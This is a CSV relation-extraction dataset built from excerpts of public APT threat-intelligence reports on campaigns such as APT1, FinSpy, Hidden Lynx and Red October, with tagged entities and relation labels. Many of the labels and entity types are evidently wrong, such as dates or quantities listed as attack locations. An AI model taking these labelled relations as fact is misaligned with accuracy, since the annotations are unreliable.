"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"15-2013-youonlyclicktwice","hasattacklocation","FinSpy","ORG","Malaysia","GPE","Taken together , FinSpy servers are currently , or have been present , in 25 countries . Australia , Bahrain , Bangladesh , Brunei , Canada , Czech Republic , Estonia , Ethiopia , Germany , India , Indonesia , Japan , Latvia , Malaysia , Mexico , Mongolia , Netherlands , Qatar , Serbia , Singapore , Turkmenistan , United Arab Emirates , United Kingdom , United States , Vietnam . "
"2q-report-on-targeted-attack-campaigns","hasattacklocation","EvilGrab","ORG","China","GPE","Government organizations were , by far , the most affected by EvilGrab . This geolocation is based on the IP addresses of the victims . Therefore , foreign institutions within China would be identified as coming from China ; the same would hold true for all countries . "
"fireeye-malware-supply-chain","hasattacktime","seven","CARDINAL","June 27, 2012","DATE","We identified seven different samples linked to the Google - blogspot campaign . These samples were all detected as Trojan . APT.Gh0st or Trojan . APT.PoisonIvy . The Google - blogspot samples had compile timestamps between September 16 , 2008 and June 27 , 2012 . "
"Safe-a-targeted-threat","hasattacklocation","C&C","ORG","China","GPE","The extensive logging performed by the C&C servers , however , allowed us to differentiate between the victims¡¯ and operators¡¯ IP addresses . Table 3 : Geographic Locations of the Mongolbaatar C&C Server Operators¡¯ IP Addresses Table 4 : Geographic Locations of the Getapencil C&C Server Operators¡¯ IP Addresses While most of the operator interactions we saw were from China and Hong Kong , we also saw the use of VPNs and proxy tools , including Tor , which contributed to the geographic diversity of the operators¡¯ IP addresses . "
"2013-9","hascharacteristics","Night Dragon","WORK_OF_ART","8","CARDINAL","As was the case in Night Dragon , the NSM bulletin suggests that the attacks varied slightly each time so as to avoid AV detection . An article by Defense News quotes NSM as stating that ¡ ° the attacks have , on several occasions , come when the companies have been involved in large - scale contract negotiations.¡±11 This could suggest that the attackers were privy to the negotiations . Interestingly , in 2010 Nor.way¡¯s Statoil was engaged in negotiations with China Oilfield Services , Ltd. ( COSL ) . According to the Wall Street Journal , COSL is the ¡ ° oil - field services and rig - construction unit of state - controlled China National Offshore Oil Corp. , the country¡¯s 8 BBC News . "
"Inside_Report_by_Infosec_Consortium","hasattacklocation","Norman","PERSON","India","GPE","While the ¡ ® Hangover¡¯ report itself has been widely debated in the Indian Information Security community , there is little proof , beyond circumstantial evidence provided in the Norman report , that Indian actors were behind this APT campaign , and the larger concern remains that India is the victim of numerous APT campaigns , rather than an instigator of this threat . "
"hidden_lynx","hasattacktime","WSDHEALTHY","ORG","seven months","DATE","There is also a peak at the beginning of the year which is a result of another high distribution campaign called WSDHEALTHY . This campaign , along with some other notable attacks and techniques , will be discussed in the following sections . . GOTHAM . Shared distribution , shared C&C . yet another zero day exploit . WSDHEALTHY . Watering - hole campaigns pre - dating VOHO by seven months . "
"Mandiant_APT1_Report","hasattacklocation","Rodney","PERSON","South East Asian","NORP","We have also observed DOTA using the names Rodney and Raith to communicate via email in fluent English Dota : a harry ¡ ° Poter¡± fan ? with various targets including South East Asian military The DOTA persona also appears to be a organizations in Malaysia and the Philippines . "
"The_Epic_Turla_Operation","indicates","Windows XP","PRODUCT","several hundred","CARDINAL","The attackers behind Epic Turla have infected several hundred computers in more than 45 countries , including government institutions , embassies , military , education , research and pharmaceutical companies . The attacks are known to have used at least two zero - day exploits : CVE-2013 - 5065 -Privilege escalation vulnerability in Windows XP and Windows 2003 CVE-2013 - 3346 -Arbitrary code - execution vulnerability in Adobe Reader "
"15-2013-youonlyclicktwice","hasattacklocation","FinSpy","ORG","India","GPE","Taken together , FinSpy servers are currently , or have been present , in 25 countries . Australia , Bahrain , Bangladesh , Brunei , Canada , Czech Republic , Estonia , Ethiopia , Germany , India , Indonesia , Japan , Latvia , Malaysia , Mexico , Mongolia , Netherlands , Qatar , Serbia , Singapore , Turkmenistan , United Arab Emirates , United Kingdom , United States , Vietnam . "
"rpt-operation-saffron-rose","hasproduct","vaultcli.DLL","ORG","Stealer","PRODUCT","The Stealer component uses common techniques to acquire credential data . For instance , it loads vaultcli . DLL and uses various APIs shown below to acquire RDP accounts from the Windows vault . "
"1401223631603288","hascharacteristics","the Passage of Time  Table 4","WORK_OF_ART","4","CARDINAL","Attack Techniques Improve with the Passage of Time Table 4 shows the footprints of the attacker and a summary of the response . The ETSO Attack Group is seen here to have improved its attack technique in various ways as time passes . Table 4 . "
"Mandiant_APT1_Report","hasattacklocation","DOTA","ORG","Malaysia","GPE","We have also observed DOTA using the names Rodney and Raith to communicate via email in fluent English Dota : a harry ¡ ° Poter¡± fan ? with various targets including South East Asian military The DOTA persona also appears to be a organizations in Malaysia and the Philippines . "
"securelist.com-Red October Diplomatic Cyber Attacks Investigation","hascharacteristics","The Hunt For The Red October¡±)","WORK_OF_ART","¡°Red October¡±","EVENT","A large scale cyber - espionage network was revealed and analyzed during the investigation , which we called ¡ ° Red October¡± ( after famous novel ¡ ° The Hunt For The Red October¡± ) . "
"Mandiant_APT1_Report","hasattacklocation","CPC","ORG","China","GPE","The PLA¡¯s cyber command is fully institutionalized within the CPC and able to draw upon the resources of China¡¯s state - owned enterprises to support its operations . The CPC is the ultimate authority in Mainland China ; unlike in Western societies , in which political parties are subordinate to the government , the military and government in China are subordinate to the CPC . "
"RAP002_APT1_Technical_backstage.1.0","indicates","Terminator","WORK_OF_ART","7","CARDINAL","When the server is starting , a password is asked : Figure 7 : Terminator password "
"C5_APT_C2InTheFifthDomain","indicates","Murcy","PRODUCT","three","CARDINAL","Figure 7describes how the first three decoded bytes are constructed , and can be used to implement adecoding algorithm . 2nd Base64encodedcharacter 4thBase64encodedcharacter FIGURE6 : BITPLACEMENTINBASE64DECODING The data sent to the C2 server is dependent on the C2 instructions received . Commands the Murcy malwarereportedly understandsareshowninAnnex D.(SafeZoneCast , 2011 ) "
"Kimsuky","hasproduct","Trojan.Win32.Kimsuky","ORG","Team Viewer","PRODUCT","We detect these threats as Trojan . Win32.Kimsuky except modified Team Viewer client components which are detected as Trojan.Win32.Patched.ps . "
"2013-9","hasattacktime","Russian","NORP","2006","DATE","A high - level understanding of the Russian approach to cyber warfare An interesting relationship between Russia and BP has unfolded over the past decade , revealing a series of exchanges that highlight a tenuous co - existence . The figure below displays this in detail , aligned with geopolitical events . The exchange begins in 2006 when the Russian state - run gas company Rosneft went public on the London stock ex.change and BP purchased 1 billion in shares . "
"comment_crew_indicators_of_compromise","hasattacklocation","Sundays","DATE","North Africa","GPE","President Chavezs Comments About President Obama and the United States on Sundays "" Alo , Presidente "" . FW : New Standdard Operational Procedures ( SOPs ) between the . AGENDA . [ REMOVED ] Help You Save Enough for Retirement . Human right of north Afica under war . Spreading Civil Unrest in the Middle East and North Africa . "
"Kimsuky","targets","Trojan.Win32.Kimsuky","ORG","Team Viewer","PRODUCT","We detect these threats as Trojan . Win32.Kimsuky except modified Team Viewer client components which are detected as Trojan.Win32.Patched.ps . "
"2013-9","hasattacklocation","Mandiant","ORG","Beijing","GPE","Mandiant even acknowledges the article written by Bloomberg in their report , and identifies the ¡ ° Comment Group¡± as an alias IP Addresses & Origins While about half of the reports omitted IP ranges , the majority of IP address ranges mentioned came from service provided by China Unicom to one of two locales : Beijing or Shanghai . "
"Mandiant_APT1_Report","hasattacklocation","130,663 square feet","QUANTITY","Chinese","NORP","At 12 stories in height , and offering 130,663 square feet of space , we estimate that this building houses offices for approximately 2,000 people . Figure 4 through Figure 7 provide overhead views and street - level views of the building and its location , showing its size . This is only one of the unit¡¯s several buildings , some of which are even larger . 20 Two Chinese universities hosting Unit 61398 recruiting events : . "
"India_Pak_Tranchulas","hasattacklocation","Operation Hangover: Unveiling an Indian Cyberattack Infrastructure","WORK_OF_ART","Thailand","GPE","Nearly two months later , the Norwegian antivirus and security firm Norman issued an investigative analysis report titled Operation Hangover : Unveiling an Indian Cyberattack Infrastructure that detailed cyber espionage activities associated with the Telenor compromise . They noted similar targeting campaigns thatwere observed exploiting numerous industries and organizations within Norway , Pakistan , US , Iran , China , Taiwan , Thailand , Jordan , Indonesia , UK , Germany , Austria , Poland , and Romania . "
"evasive-tactics-terminator-rat.html","hasattacklocation","Terminator RAT (Remote Access Tool","LAW","Taiwan","GPE","In this post we will explore changes made to Terminator RAT ( Remote Access Tool ) by examining a recent attack against entities in Taiwan . "
"hidden_lynx","indicates","Java","PRODUCT","two","CARDINAL","This Java exploit was patched at the time . Having already used two zero - day exploits in quick succession ( the first zero - day exploit was used in the GOTHAM campaign in May 2012 , see appendix for more details ) , the Hidden Lynx group may not have had another one at their disposal . "
"RAP002_APT1_Technical_backstage.1.0","indicates","Scanner","PRODUCT","5.4","CARDINAL","Registry access to the infected machine Figure 18 : Terminator : Services management on the infected machine Figure 19 : Terminator : Information about the infected machine Figure 20 : Terminator : Installed software on the infected machine 5.4 Scanner "
"fireeye-china-chopper-report","hasattacklocation","FireEye","ORG","China","GPE","To contribute something new to the public knowledge base¡ªespecially for those who happen to find the China Chopper server - side payload on one of their Web servers¡ªFireEye studied the components , capabilities , payload attributes , and the detection rate of this 4 kilobyte menace . This report describes the features that make China Chopper an increasingly popular tool for cyber attackers . "
"themysteryofthepdf0-dayassemblermicrobackdoor","indicates","LoadLibary API. Resource 102","PRODUCT","two","CARDINAL","It contains two binary resources , 101 and 102 . Resource 101 is the main backdoor DLL component . It is written to the % AppData% directory and loaded using LoadLibary API . Resource 102 is the decoy PDF document . "
"Safe-a-targeted-threat","hasattacklocation","C&C","ORG","South Sudan","GPE","First , we were able to download a list of victims that were currently online from the C&C servers . Second , we were also able to download logs from the C&C servers that listed all of the IP addresses that ¡ ° checked in¡± to them using the REQUEST_TYPE_CLIENT_REQUEST function . The first set of C&C servers ( i.e. , mongolbataar ) appeared to have only three ¡ ° live¡± victims¡ªone with an IP address assigned to South Sudan , another with an address assigned to Mongolia , and another that did not list an external IP address . "
"15-2013-youonlyclicktwice","hasattacklocation","FinSpy","ORG","Singapore","GPE","Taken together , FinSpy servers are currently , or have been present , in 25 countries . Australia , Bahrain , Bangladesh , Brunei , Canada , Czech Republic , Estonia , Ethiopia , Germany , India , Indonesia , Japan , Latvia , Malaysia , Mexico , Mongolia , Netherlands , Qatar , Serbia , Singapore , Turkmenistan , United Arab Emirates , United Kingdom , United States , Vietnam . "
"fireeye-malware-supply-chain","hasattacktime","Trojan","PRODUCT","between January 1, 2013 and August 24, 2013","DATE","These samples were detected as Trojan . APT.Gh0st , Trojan . APT.PoisonIvy , Trojan . APT . Briba , and Trojan . APT.9002 . All of the Sunshop samples that we identified had compile times between January 1 , 2013 and August 24 , 2013 . "
"fireeye-wwc-report","hasattacklocation","Earth","LOC","China","GPE","In 2009 , Chinese Prime Minister Wen Jiabao announced that a cybercriminal from Taiwan had stolen his upcoming report to the National People¡¯s Congress.25 In 2013 , Edward Snowden , a former system administrator at the National Security Agency ( NSA ) , published documents suggesting that the U.S. conducted cyber espionage against China;26 and the Chinese Computer Emergency Response Team ( CERT ) stated that it possessed ¡ ° mountains of data¡± on cyber attacks by the U.S.27 North Korea¡ªthe upstart North and South Korea remain locked in one of the most intractable conflicts on Earth . North Korea ( supported by China ) would seem to be stuck in a cyber Stone Age¡ªespecially relative to South Korea ( supported by the U.S.)¡ªhas the fastest download speeds in the world28 and will issue its students with computer tablets instead of books by 2015.29 Even so , the Internet offers anyone , and any nation , an asymmetric way to gather intelligence and project national power in cyberspace¡ªand North Korea appears to have acquired cyber attacks as a new weapon for its arsenal . "
"winnti-more-than-just-a-game-130410","hasproduct","Outlook","ORG","Windows","PRODUCT","Targetted attack email in the list of Outlook messages . We discovered a Windows prefetch file in the system directory , that was created when the malicious attachment was opened . "
"winnti-more-than-just-a-game-130410","hasattacklocation","Chinese","NORP","China","GPE","We also hope that our message will reach Chinese law enforcement agencies . If the current research is not enough to initiate criminal investigation , we hope that it will be enough at least to make some checks and probably prevent other malicious activity from reaching out foreign countries and business within China . "
"fireeye-malware-supply-chain","indicates","DTL","ORG","seven","CARDINAL","We found seven different samples linked to the DTL campaign . "
"2013-9","hasattacklocation","Operation Aurora","ORG","China","GPE","Oil Firms Hit by Hackers From China , Report Says . Retrieved From http://online.wsj.com/article/SB10001424052748703716904576134661111518864.html wwwt.infosupports.com With that said , there is another somewhat tenuous connection between two of the campaigns : Mirage and Elderwood . Night Dragon is not the only instance where an individual in China is charged with providing infrastructure to the attack.ers via their business . HB Gary authored a report in the wake of Operation Aurora which implicated a business called Bentium operating 3322.org out of Changzhou and a man named Peng Yong as providing dynamic DNS services to the attackers.4 Operation Aurora was tied to Elderwood in Symantec¡¯s Elderwood Project report and elsewhere . "
"2013-9","hasattacklocation","Mandiant¡¯","ORG","China","GPE","Though this may seem farfetched , a report released by a Luxemburg security firm details how , in the wake of Mandiant¡¯s APT1 report , they decided to engage in an intelligence gathering operation on the APT groups operating out of China . "
"NS-Unveiling-an-Indian-Cyberattack-Infrastructure_FINAL_Web","indicates","16:44:44","TIME","one","CARDINAL","The name , ¡ ° Operation Hangover¡± , was derived from the name of one of the most frequently used malwares . The project debug path is often visible inside executable files belonging to this family . $ telnet 37.59.231.161 587 Trying 37.59.231.161 ... Connected to 37.59.231.161 . Escape character is ' ^ ] ' . 220 server.enlighten-energy.org ESMTP Exim 4.80.1 Sat , 23 Mar 2013 16:44:44 -0400 "
"securelist.com-Red October Diplomatic Cyber Attacks Investigation","hasattachment","at least one","CARDINAL","Trojan","PRODUCT","That is how we discovered more than 300 unique systems , which had detected at least one module of this Trojan kit . "
"The_Monju_Incident","hasattacklocation","WHITE","ORG","Japan","GPE","WHITEWHITE - Unlimited Distribution Sources may use TLP : WHITE when information carries minimal or no foreseeable risk of misuse , in accordance with applicable rules and procedures for public release . Subject to standard copyright rules , TLP : WHITE information may be distributed freely , without restriction . 2 Executive Summary On 2nd January 2014 a Systems Administrator at the Monju fast breeder reactor facility in Japan noticed suspicious connections emanating from a machine in the control room , coinciding with what was a seemingly routine software update to a free media player . "
"hidden_lynx","runssoftware","1","CARDINAL","Moudoor","PRODUCT","The list of browser - based exploits used by the Hidden Lynx group since the introduction of Moudoor is presented in Table 1 . "
"RAP002_APT1_Technical_backstage.1.0","indicates","10AM","TIME","the hour","TIME","Here is the average working hours for a week ( the hour on the graph is UTC+1 ): Figure 1 : Attackers working hours Generally , the attackers worked between 2AM and 10AM from Monday to Saturday included . "
"crowdstrike-deep-panda-report","hasproduct","Iphlpapi.dll","ORG","Windows Vista","PRODUCT","In this post , I will share with you a simple code to hide port under Vista , hopeit is useful for some guys .Actually under Windows Vista , netstat.exe will call InternalGetTcpTable2 whichis exported by Iphlpapi.dll to list all open ports , then InternalGetTcpTable2will transfer control to NsiAllocateAndGetTable which is exported by nsi.dll , kernel mode module of NSI -- nsiproxy.sys . "
"The_Epic_Turla_Operation","hasproduct","Adobe Reader","ORG","Windows XP","PRODUCT","The attacks are known to have used at least two zero - day exploits : CVE-2013 - 5065 -Privilege escalation vulnerability in Windows XP and Windows 2003 CVE-2013 - 3346 -Arbitrary code - execution vulnerability in Adobe Reader "
"Mandiant_APT1_Report","hasattacktime","GSD","ORG","2002)","DATE","Within the GSD , the 3rd Department has a combined focus on signals intelligence , foreign language proficiency , and defense information 6 James C. Mulvenon and Andrew N. D. Yang , editors , The People¡¯s Liberation Army as Organization : Reference Volume v1.0 , ( Santa Monica , CA : RAND Corporation , 2002 ) , 96 , http://www.rand.org/pubs/conf_proceedings/CF182.html , accessed February 6 , 2013 . 7 Bryan Krekel , Patton Adams , and George Bakos , ¡ ° Occupying the Information High Ground : Chinese Capabilities for Computer Network Operations and Cyber Espionage,¡± "
"fireeye-wwc-report","hasattacktime","$631 million","MONEY","2009","DATE","China allegedly stole the blueprints for the Australian Security Intelligence Organization¡¯s new $ 631 million building.17 . Worldwide : In 2009 , Canadian researchers discovered that China controlled a worldwide cyber espionage network in over 100 countries.18 In 2010 , a Chinese telecommunications firm transmitted erroneous routing information for 37,000 computer networks , which misrouted some Internet traffic through China for 20 minutes . "
"1401223631603288","indicates","¡°Winnti,¡±","PRODUCT","two","CARDINAL","Malware Toolkit of ETSO Group AhnLab analyzed two malware toolkits of ETSO and confirmed they were the same or very similar to the malware ¡ ° Winnti,¡± named by Kaspersky Labs and the malware toolkit ¡ ° TrendMicro Plug¡± named by TrendMicro . "
"15-2013-youonlyclicktwice","hasproduct","iOS","ORG","FinSpy","PRODUCT","The FinFisher suite includes mobile phone versions of FinSpy for all major platforms including iOS , Android , Windows Mobile , Symbian and Blackberry . "
"hidden_lynx","hasattacktime","Trojans","NORP","more than six months earlier","DATE","During this incident , a number of Trojans and malicious scripts were signed . In a follow up post on February 25 , more details of the attack emerged . In July 2012 , more than six months earlier , a malicious third - party gained access to their network using an SQL injection attack . "
"rpt-china-chopper","hasproduct","China Chopper","ORG","Windows","PRODUCT","This OS and application flexibility make China Chopper an even more dangerous Web shell . ¡ ° Server - side Payload Component¡± on Page 5 showed China Chopper executing on a Windows 2003 IIS server using ASPX . Figure 19 shows it running on Linux with PHP . Here , the contents of the PHP version are just as minimalistic .. While the available options differ depending on what platform China Chopper is running on , the file management features in Linux ( see Figure 20 ) are similar to those in Windows . "
"fireeye-wwc-report","hasattacklocation","more than four","CARDINAL","the United States","GPE","The attack exposed data from 8,000 U.S. networks , 1,100 Australian networks , and 230 French networks.19 Chinese cyber tactics The People¡¯s Republic of China ( PRC ) is home to 1.35 billion people , or more than four times the population of the United States . "
"India_Pak_Tranchulas","hasattacklocation","Operation Hangover: Unveiling an Indian Cyberattack Infrastructure","WORK_OF_ART","Norway","GPE","Nearly two months later , the Norwegian antivirus and security firm Norman issued an investigative analysis report titled Operation Hangover : Unveiling an Indian Cyberattack Infrastructure that detailed cyber espionage activities associated with the Telenor compromise . They noted similar targeting campaigns thatwere observed exploiting numerous industries and organizations within Norway , Pakistan , US , Iran , China , Taiwan , Thailand , Jordan , Indonesia , UK , Germany , Austria , Poland , and Romania . "
"hidden_lynx","hasattacklocation","Bit9","ORG","Hong Kong","GPE","Along with this , early links to the attacks on Bit9 began to emerge . The timeline of this activity is shown in Figure 16 . In these campaigns , the Hidden Lynx group made heavy use of infrastructure in Hong Kong , with the exception of yahooeast.net . "
"fireeye-poison-ivy-report","hasproduct","Calamine ChopShop","ORG","FireEye Poison Ivy","PRODUCT","Calamine ChopShop module The FireEye Poison Ivy decoder checks the beginning of each TCP session for possible PIVY challengeresponse sequences . "
"rpt-operation-saffron-rose","indicates","Stealer","PRODUCT","two","CARDINAL","The following two PDB paths were seen in the collection of implants that we collected : . d:\svn\Stealer\source\Stealer\Stealer\obj\x86\Release\Stealer.pdb . f:\Projects\C#\Stealer\source\Stealer\Stealer\obj\x86\Release\Stealer.pdb These strings indicate that the Stealer source code was stored in two different paths but not necessarily on two different computers . "
"fireeye-malware-supply-chain","indicates","Trojan.APT.9002","PRODUCT","seven","CARDINAL","We found seven different samples linked to the DTL campaign . All of these samples were detected as Trojan . APT.9002 . "
"Syrian_Malware_Team_BlackWorm","indicates","BlackWorm v2.1","PRODUCT","the Dark Edition","WORK_OF_ART","In addition to the features supported by the command structure , the payload can : Seek and kill no - ip processes DUC30 and DUC20 Disable Task Manager to kill process dialog Copy itself to USB drives and create autorun entries Copy itself to common peer - to - peer ( P2P ) share locations Collect system information such as OS , username , hostname , presence of camera , active window name , etc . , to display in the controller Kill the following analysis processes ( if found ): procexp SbieCtrl SpyTheSpy SpeedGear Wireshark MBAM ApateDNS IPBlocker cPorts ProcessHacker AntiLogger The Syrian Malware Team primarily uses another version of BlackWorm called the Dark Edition ( v2.1 ) . BlackWorm v2.1 was released on a prolific underground forum where information and code is often shared , traded and sold . "
"icefog","hasproduct","Icefog","ORG","Mac OS X","PRODUCT","There are versions for both Microsoft Windows and Mac OS X. In its latest incarnation , Icefog doesn¡¯t automatically exfiltrate data , instead , it is operated by the attackers to perform actions directly on the victim¡¯s live systems . "
"Mandiant_APT1_Report","hasattacktime","hundreds of terabytes","QUANTITY","years","DATE","Organizations compromised by APT1 over time 2006 2007 2008 2009 2010 2011 aPt1 : years oF esPIonaGe Our evidence indicates that APT1 has been stealing hundreds of terabytes of data from at least 141 organizations across a diverse set of industries beginning as early as 2006 . "
"2013-9","hasattacklocation","millions of dollars","MONEY","China","GPE","The development of im.proved refining and mining equipment takes years and can cost millions of dollars . Exploration costs for finding new oil reserves have almost tripled in the past decade.21 They could save billions of dollars and shave years of research off by acquiring technology from petrochemical corporations that are already heavily invested in this continuing process . It also means that China would be able to compete in the global market place much sooner and more competitively than if they waited to develop the technology on their own . "
"Inside_Report_by_Infosec_Consortium","hasattacklocation","Norman¡¯s Malware Detection Team","ORG","India","GPE","The recent ¡ ® Operation Hangover¡¯ report from Norman¡¯s Malware Detection Team has projected India as an emerging APT actor . "
"1401223631603288","hasattacklocation","ETSO","ORG","South Korea","GPE","According to the study , ETSO is different from other attackers in following ways : - ETSO analyzes the update structure of a product popularly used in South Korea , in order to distribute malicious codes through reliable products and ultimately , the company . "
"Mandiant_APT1_Report","hasattacklocation","Chinese","NORP","China","GPE","Second , it is a fairly common practice for the Chinese , even in China , to choose an English first name . "
"15-2013-youonlyclicktwice","hasattacklocation","FinSpy Mobile","ORG","Australia","GPE","Additionally , it provides examination of a FinSpy Mobile sample found in the wild , which appears to have been used in Vietnam . 1 . SUMMARY OF KEY FINDINGS . We have found command and control servers for FinSpy backdoors , part of Gamma International¡¯s FinFisher ¡ ° remote monitoring solution,¡± in a total of 25 countries : Australia , Bahrain , Bangladesh , Brunei , Canada , Czech Republic , Estonia , Ethiopia , Germany , India , Indonesia , Japan , Latvia , Malaysia , Mexico , Mongolia , Netherlands , Qatar , Serbia , Singapore , Turkmenistan , United Arab Emirates , United Kingdom , United States , Vietnam . . "
"Inside_Report_by_Infosec_Consortium","hasattacklocation","An INFOSEC CONSORTIUM Event                          Objective","LAW","India","GPE","Supported by An INFOSEC CONSORTIUM Event Objective : The objective of this report is the following : . An overview of malware distribution in Indian Cyberspace . Detailed , in - depth technical analysis of Advanced Persistent Threat ( APT ) actors against India . "
"theteamspystory_final_t2","hasproduct","XmlPath","ORG","Keylogger","PRODUCT","Then this file is opened and appended with new data received from Keylogger thread . Please note , that at least empty file at XmlPath must be created , the keylogger starts saving collected data only if it finds file at XmlPath . "
"Inside_Report_by_Infosec_Consortium","hasattacklocation","Travnet","ORG","China","GPE","www.viprambler.com Let¡¯s start with the analysis of ¡ ° www.viprambler.com¡±. WHOIS record for the domain currently is as follows : Registrant information for the domain is as follows : Our analysis strongly suggests that the group behind Travnet might be from China . The above record is just one of the findings that supports the claim . Its interesting to note that the domain was recently registered , is locked & expires in 2014 . Another interesting observation is the address of the registrant . ¡ ° Guangdong¡± province from China seems to pop up everywhere . "
"Mandiant_APT1_Report","hascharacteristics","61398","CARDINAL","2","CARDINAL","Identifying GsD 3rd Department , 2nd Bureau as unit 61398 The care with which the PLA maintains the separation between the GSD 3rd Department , 2nd Bureau , and the MUCD 61398 can be partially observed by searching the Internet for official documents from the Chinese government that refer to both the 2nd Bureau and Unit 61398 . Figure 2 shows the results of one of these queries . "
"hidden_lynx","hasproduct","Moudoor","ORG","Java","PRODUCT","Although no zero - day exploit was available , they used a patched Java exploit ( CVE-2011 - 3544 ) effectively to distribute Moudoor from three compromised websites . "
"fireeye-poison-ivy-report","hasattacktime","Poison Ivy","ORG","2009","DATE","Several ongoing cyber attack campaigns use Poison Ivy , including these : . admin@338¡ªActive since 2008 , this campaign mostly targets the financial services industry , though we have also seen activity in the telecom , government , and defense sectors . . th3bug¡ªFirst detected in 2009 , this campaign targets a number of industries , primarily higher education and healthcare . . "
"winnti-more-than-just-a-game-130410","hasattacklocation","the C&C","ORG","Japan","GPE","The subdomains ¡ ° ru¡± , ¡ ° kr¡± , ¡ ±jp¡± and ¡ ° us¡± most probably mean that these C&C servers manage bots hosted on the computers of companies located in Russia , South Korea , Japan and the U.S. respectively , while ¡ ° fs¡± and ¡ ° as¡± are acronyms for the names of the companies being attacked . Sometimes Winnti¡¯s malicious programs had a local IP address , such as 192.168.1.136 , specified in the settings for the C&C. "
"Mandiant_APT1_Report","hasattacklocation","the 1950s","DATE","China","GPE","¡ ° Simplified Chinese¡± is a streamlined set of the traditional Chinese characters that have been in use since the 1950s , originating in mainland China . "
"15-2013-youonlyclicktwice","hasattacklocation","FinSpy.      3.2 FinSpy Mobile","ORG","Vietnam","GPE","The existence of a FinSpy sample that contains Ethiopia - specific imagery , and that communicates with a still - active command & control server in Ethiopia strongly suggests that the Ethiopian Government is using FinSpy . 3.2 FinSpy Mobile in Vietnam We recently obtained and analyzed a malware sample6 and identified it as FinSpy Mobile for Android . The sample communicates with a command & control server in Vietnam , and exfiltrates text messages to a Vietnamese telephone number . "
"stuxnet_0_5_the_missing_link","indicates","Stuxnet 0.5","PRODUCT","one","CARDINAL","A list is available in Appendix A. Replication Stuxnet 0.5 uses one form of replication through Step 7 project archives . When a removable drive is inserted in an infected system , Stuxnet 0.5 will infect any Step 7 project archives with a .s7p or .zip file name extension on the drive . "
"securelist.com-Red October Detailed Malware Description 4 Second Stage of Attack","indicates","Reader","PRODUCT","Adobe","ORG","The module retrieves the Adobe Reader installation path by reading the registry value : HKLMSOFTWAREClassesSoftwareAdobeAcrobatExe@default Then , it tries to identify the version of installed software by searching for strings ¡ ° 10.0¡± , ¡ ° 9.0¡± , ¡ ° 8.0¡± in the installation path . "
"Unveiling_an_Indian_Cyberattack_Infrastructure","hasattacklocation","Khalistancalling.com","ORG","North-Western Burma","LOC","Khalistancalling.com has since moved on to another bad IP ( 46.182.104.83 ) and must be considered owned by the attackers . The Nagaland movement The Nagaland ( or Nagalim ) movement is another secessionist group aiming to create a sovereign homeland for the Naga people living in North - Eastern India and North - Western Burma . "
"securelist.com-Red October Detailed Malware Description 2 Second Stage of Attack","hasproduct","Opera","ORG","Firefox","PRODUCT","Chrome , Mozilla Firefox , Internet Explorer , Opera 1 . Chrome history : Before the malware is performing the SQL queries on the browsers profile - files , it copies the original file into a temp - file . "
"NS-Unveiling-an-Indian-Cyberattack-Infrastructure_FINAL_Web","hasattacklocation","Naga","NORP","India","GPE","The Nagaland ( or Nagalim ) movement is another secessionist group aiming to create a sovereign homeland for the Naga people living in North - Eastern India and North - Western Burma . "
"themysteryofthepdf0-dayassemblermicrobackdoor","targets","Duqu","PERSON","GIF","PRODUCT","The picture from the GIF file is actually very small and reminds us of the method used by Duqu back in 2011 to hide data , known as ¡ ® steganography¡¯ : At offset 0x6a4 inside the GIF file , there is a hidden encrypted PE file . "
"The_Uroburos_case","indicates","Windows","PRODUCT","two","CARDINAL","The two files are Microsoft Windows dynamic libraries . "
"hidden_lynx","hasproduct","VOHO","ORG","Trojan","PRODUCT","This Trojan was leveraged for a special operation during the VOHO campaign and is probably used by a specific team of highly skilled attackers within the group . "
"19-2013-acalltoharm","hasproduct","Freegate","ORG","Virtual Private Network","PRODUCT","In this attack , which we first observed in the second week of June , the potential victim is encouraged to visit a download link containing a malicious installer of Freegate . Freegate is a standalone circumvention - bypassing Virtual Private Network ( VPN ) client for Windows . Legitimate versions of the Freegate software are available for download on its website . "
"winnti-more-than-just-a-game-130410","hasattacklocation","the C&C","ORG","Russia","GPE","The subdomains ¡ ° ru¡± , ¡ ° kr¡± , ¡ ±jp¡± and ¡ ° us¡± most probably mean that these C&C servers manage bots hosted on the computers of companies located in Russia , South Korea , Japan and the U.S. respectively , while ¡ ° fs¡± and ¡ ° as¡± are acronyms for the names of the companies being attacked . Sometimes Winnti¡¯s malicious programs had a local IP address , such as 192.168.1.136 , specified in the settings for the C&C. "
"Surtr_Malware_Tibetan","hasproduct","DiskLoydb","ORG","FileList.db","PRODUCT","For example , in nView_DiskLoydb , a file called FileList.db that contains file and directory listings will be placed and nView_KeyLoydb will contain text files with keylogger output . "
